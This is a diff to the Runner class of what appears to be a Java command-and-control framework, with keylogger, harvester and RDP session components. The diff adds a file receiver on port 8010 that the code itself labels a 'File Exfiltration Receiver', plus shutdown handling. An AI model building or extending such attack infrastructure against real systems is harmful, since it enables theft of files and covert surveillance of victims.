@@ -21,6 +21,7 @@ import c2.session.CommandLoader;
 import c2.session.CommandMacroManager;
 import c2.session.IOManager;
 import c2.session.SessionManager;
+import c2.tcp.filereceiver.FileReceiverSessionReceiver;
 
 public class Runner {
 	public static void main(String args[]) throws InterruptedException, ExecutionException {
@@ -50,12 +51,21 @@ public class Runner {
 	private List<Future<?>> runningServiceFutures = new ArrayList<>();
 
 	private CountDownLatch startupLatch = new CountDownLatch(1);
+	private CountDownLatch deathLatch = new CountDownLatch(1);
 
 	private HarvestProcessor harvester;
 
 	public void awaitFullStartup() {
 		try {
 			startupLatch.await();
+		} catch (InterruptedException e) {
+			// meh, don't worry about it
+		}
+	}
+	
+	public void awaitFullShutdown() {
+		try {
+			deathLatch.await();
 		} catch (InterruptedException e) {
 			// meh, don't worry about it
 		}
@@ -122,6 +132,10 @@ public class Runner {
 			cl = new CommandLoader(new HashMap<>(), new HashMap<>(), new ArrayList<>());
 		}
 
+		//TODO: Make configurable
+		FileReceiverSessionReceiver receiver = new FileReceiverSessionReceiver(8010, Paths.get("test", "fileReceiverTest"));
+		service.execute(receiver);
+		
 		ioManager = new IOManager(Paths.get(properties.getProperty(Constants.HUBLOGGINGPATH)), cl);
 
 		keylogger = new KeyloggerProcessor();
@@ -156,11 +170,6 @@ public class Runner {
 			}
 		} catch (InterruptedException ex) {
 			notifyAllServicesForShutdown();
-			/*
-			 * httpManager.notifyPendingShutdown();
-			 * dnsEndpointEmulator.notifyPendingShutdown(); tcp.notifyPendingShutdown();
-			 * emailHandler.notifyPendingShutdown();
-			 */
 			keylogger.stop();
 			System.out.println("Shutting down");
 			service.shutdownNow();
@@ -169,18 +178,15 @@ public class Runner {
 			System.out.println("Stopped session manager");
 			winManager.teardown();
 			System.out.println("Stopped RDP session manager");
-			/*
-			 * httpManager.stop(); System.out.println("Stopped HTTPS manager");
-			 * dnsEndpointEmulator.stop(); System.out.println("Stopped DNS manager");
-			 * tcp.stop(); System.out.println("Stopped TCP acceptor"); emailHandler.stop();
-			 * System.out.println("Stopped email handler");
-			 */
 			shutdownAllServices();
+			System.out.println("Stopping File Exfiltration Receiver");
+			receiver.kill();
 			System.out.println("Teardown complete, all functions terminated");
 		} catch (Exception ex) {
 			ex.printStackTrace();
 		}
 
+		deathLatch.countDown();
 	}
 
 	public void engageInterface(C2Interface in) {
